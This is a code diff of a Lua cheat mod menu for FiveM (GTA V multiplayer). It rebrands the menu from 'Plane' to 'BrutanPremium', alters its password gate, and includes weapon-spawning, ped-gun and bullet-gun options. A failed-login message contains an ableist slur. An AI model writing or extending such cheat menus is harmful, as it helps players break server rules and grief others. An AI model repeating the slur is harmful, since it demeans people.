+                elseif BrutanPremium.ComboBox("Vehicle Speed", vehicleSpeed, currentVehicleSpeed, selectedVehicleSpeed, function(currentIndex, selectedIndex)
                     currentVehicleSpeed = currentIndex
                     selectedVehicleSpeed = selectedIndex
                 end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Ped Gun",
                     pedGun,
                     function(enabled)
                         pedGun = enabled
                 end)
                 then
-                elseif Plane.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
+                elseif BrutanPremium.ComboBox("Ped To Shoot", peds, currentPed, selectedPed, function(currentIndex, selectedIndex)
                     currentPed = currentIndex
                     selectedPed = selectedIndex
                 end)
                 then
-                elseif Plane.CheckBox(
+                elseif BrutanPremium.CheckBox(
                     "Bullet Gun",
                     bulletGun,
                     function(enabled)
                         bulletGun = enabled
                     end)
                 then
-                elseif Plane.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
+                elseif BrutanPremium.ComboBox("Bullet", bullets, currentBullet, selectedBullet, function(currentIndex, selectedIndex)
                     currentBullet = currentIndex
                     selectedBullet = selectedIndex
                     end)
@@ -5917,28 +8571,28 @@ Citizen.CreateThread(
 
 
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("SingleWeaponMenu") then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("SingleWeaponMenu") then
                 for i = 1, #allWeapons do
-                    if Plane.Button(allWeapons[i]) then
-                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 1000, false, false)
+                    if BrutanPremium.Button(allWeapons[i]) then
+                        GiveWeaponToPed(PlayerPedId(), GetHashKey(allWeapons[i]), 250, false, false)
                     end
                 end
 
 
 
-                Plane.Display()
+                BrutanPremium.Display()
             elseif IsDisabledControlPressed(0, 162) then
-                if logged then
-                    Plane.OpenMenu("MainMenu")
+                if planeisbest then
+                    trynaskidhuh("MainMenu")
                 else
-                    local temp = KeyboardInput("Enter Password", "", 100)
-                    if temp == pass then
-                        drawNotification("~g~Login Succesful!")
-                        logged = true
-                        Plane.OpenMenu("MainMenu")
+                    local temp = KeyboardInput("Enter Password", "brutanpremium", 100)
+                    if temp == dEI then
+                        drawNotification("~r~~h~Well done, you just logged in!")
+                        planeisbest = true
+                        trynaskidhuh("MainMenu")
                     else
-                        drawNotification("~r~Login has failed, wrong key brother")
+                        drawNotification("~r~~h~Login has failed, are you fucking retarded?")
                     end
                 end
             end
